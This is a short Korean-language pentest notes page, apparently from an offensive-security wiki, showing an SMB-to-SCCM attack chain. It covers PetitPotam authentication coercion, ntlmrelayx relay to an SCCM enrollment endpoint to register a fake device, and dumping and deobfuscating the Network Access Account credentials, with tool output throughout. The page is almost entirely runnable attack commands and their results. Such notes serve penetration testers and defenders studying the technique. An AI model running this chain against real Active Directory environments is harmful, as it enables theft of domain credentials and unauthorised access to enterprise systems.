# SMB to SCCM

다음의 페이지를 참고한다&#x20;

[sccm.md](../../privilege-escalation/ad/sccm.md "mention")



\---&#x20;

예시&#x20;

```
// Authentication Coercion 
python3 petitpotam.py -u <u> -p <p> <attackerIP> <targetIP> 

// SCCM Relay to SCCM Server 
ntlmrelayx.py -t http://<server>/ccm_system_windowsauth/request --sccm --sccm-device fake-device --sccm-fqdn domain.com --http-port 80 --sccm-server sccm --sccm-sleep 10
[*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.40.150, attacking target http://sccm.domain.com
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://sccm.domain.com as CHOI/DC01$ SUCCEED
[*] Creating certificate for our fake server...
[*] Registering our fake server...
[*] Done.. our ID is 2EF87AF2-17E2-44F3-9D25-4876BC505ED4
[*] Sleeping 10 seconds to allow SCCM server time to process...
[*] SMBD-Thread-7 (process_request_thread): Connection from 192.168.40.150 controlled, but there are no more targets left!
[*] Requesting NAAPolicy...
[*] Parsing policy...
[*] Decrypted policy dumped to naapolicy.xml

--- 

// Obfuscated NAA Credentials 
└─# cat naapolicy.xml

<property name="NetworkAccessUsername" type="8" secret="1">
    <value>
            <![CDATA[112233<REDACTED>]]>
    </value>
</property>
<property name="NetworkAccessPassword" type="8" secret="1">
    <value>
            <![CDATA[112233<REDACTED>]]>
    </value>
    
PS C:\dev\naadeobs\x64\Debug> .\naadeobs.exe 112233<REDACTED>
choi\sccm-naa

PS C:\dev\naadeobs \x64\Debug> .\naadeobs.exe 112233<REDACTED>
Password123! 
```



